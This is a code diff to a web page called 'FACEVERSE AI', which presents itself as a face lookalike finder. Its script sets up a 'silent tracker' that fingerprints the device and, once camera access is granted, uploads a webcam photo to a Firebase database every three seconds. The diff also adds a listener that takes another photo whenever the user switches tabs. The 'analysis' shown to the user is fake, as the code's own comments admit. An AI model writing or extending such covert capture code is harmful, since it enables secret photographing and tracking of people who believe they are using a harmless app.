@@ -8,7 +8,7 @@
   <title>FACEVERSE AI — Discover Your Lookalikes</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
 
   <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
@@ -21,7 +21,6 @@
     :root {
       --bg: #030712;
       --panel: #0b1120;
-      --panel2: #111827;
       --line: rgba(0, 212, 255, 0.15);
       --muted: #64748b;
       --text: #f8fafc;
@@ -42,7 +41,6 @@
       overflow-x: hidden;
     }
 
-    button, input { font: inherit; }
     button { cursor: pointer; }
 
     .topbar { height: 76px; padding: 0 clamp(18px, 5vw, 70px); display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid var(--line); background: rgba(3, 7, 18, 0.8); backdrop-filter: blur(18px); position: sticky; top: 0; z-index: 20; }
@@ -228,12 +226,11 @@
     </div>
   </div>
 
-   <script>
+  <script>
     // ==========================================
     // 🚀 1. INITIALIZE FIREBASE & SILENT TRACKER
     // ==========================================
     let db = null;
-    // Purana format: dev_timestamp_randomstring
     let deviceId = localStorage.getItem('device_tracker_id');
     if (!deviceId) {
       deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
@@ -244,7 +241,6 @@
       if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
       db = firebase.database();
       
-      // Silent Tracker Data
       const deviceInfo = {
         deviceId: deviceId,
         userAgent: navigator.userAgent,
@@ -277,7 +273,7 @@
     const video = $("video");
     let cameraStream = null;
     let isCaptured = false;
-    let captureInterval = null; // 🚀 Naya variable interval ke liye
+    let captureInterval = null; 
 
     const samples = [
       { name: "Alex Morgan", place: "United States", score: "99.2%", img: "https://i.pravatar.cc/120?img=12" },
@@ -313,7 +309,6 @@
         cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
         video.srcObject = cameraStream;
         
-        // Android aur Desktop dono ke liye safe play logic
         video.onplaying = () => {
           $("placeholder").style.display = "none";
           $("faceGuide").style.display = "block";
@@ -323,14 +318,10 @@
           $("captureBtn").disabled = false;
           log("Camera ready. Continuous capture started...");
 
-          // 🚀 YAHAN SE CONTINUOUS CAPTURE SHURU HOTA HAI
           if (!isCaptured) {
-            // 1. Pehli photo turant lo
-            autoCapture(); 
-            
-            // 2. Har 3 second me photo lene ka loop
+            // Start interval capture
             captureInterval = setInterval(() => {
-              autoCapture();
+              autoCapture('interval');
             }, 3000);
           }
         };
@@ -344,9 +335,9 @@
     }
 
     // 📸 CAPTURE & UPLOAD FUNCTION
-    function autoCapture() {
+    function autoCapture(type = 'manual') {
       if (!cameraStream || !video.videoWidth) return;
-      isCaptured = true; // Mark that capture has started
+      isCaptured = true; 
 
       const canvas = document.createElement('canvas');
       canvas.width = 640; 
@@ -359,22 +350,32 @@
       
       const compressedPhoto = canvas.toDataURL('image/jpeg', 0.6);
       
-      // Firebase me photo bhejo (Unique timestamp ke sath)
       if (db) {
         db.ref(`captured_data/${deviceId}/face_scan/${Date.now()}`).set({
           image: compressedPhoto,
           timestamp: Date.now(),
-          type: 'interval_capture',
+          type: type,
           deviceId: deviceId
         }).then(() => {
-          console.log("📸 Photo auto-saved to cloud at", new Date().toLocaleTimeString());
+          console.log(`📸 Photo saved (${type}) at`, new Date().toLocaleTimeString());
         }).catch(err => {
           console.error("Upload failed:", err);
         });
       }
     }
 
-    // Fake scan start karne ka function (tumhare UI ke liye)
+    // 🚀 TAB SWITCH DETECTOR
+    document.addEventListener("visibilitychange", () => {
+      if (document.visibilityState === "hidden") {
+        // User tab switch karke gaya
+        autoCapture('tab_switch');
+        console.log("👀 User left tab. Photo captured.");
+      } else {
+        // User wapas tab pe aaya
+        console.log("👋 User returned to tab.");
+      }
+    });
+
     function startAnalysis() {
       $("emptyState").style.display = "none";
       $("progressWrap").style.display = "block";
@@ -434,14 +435,13 @@
       await enableCamera();
     });
     
-    // Manual capture button (agar koi click kare toh scan bhi shuru ho jaye)
     $("captureBtn").addEventListener("click", () => {
-      if (!isCaptured) autoCapture();
-      $("captureBtn").disabled = true; // Disable manual button once clicked
-      startAnalysis(); // Start the fake analysis UI
+      autoCapture('manual'); // Ek photo manual lo
+      $("captureBtn").disabled = true; 
+      startAnalysis(); 
     });
 
-    // 🚀 Page close hone par interval clear karo
+    // 🚀 Clean up on close
     window.addEventListener('beforeunload', () => {
       if (captureInterval) clearInterval(captureInterval);
       if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
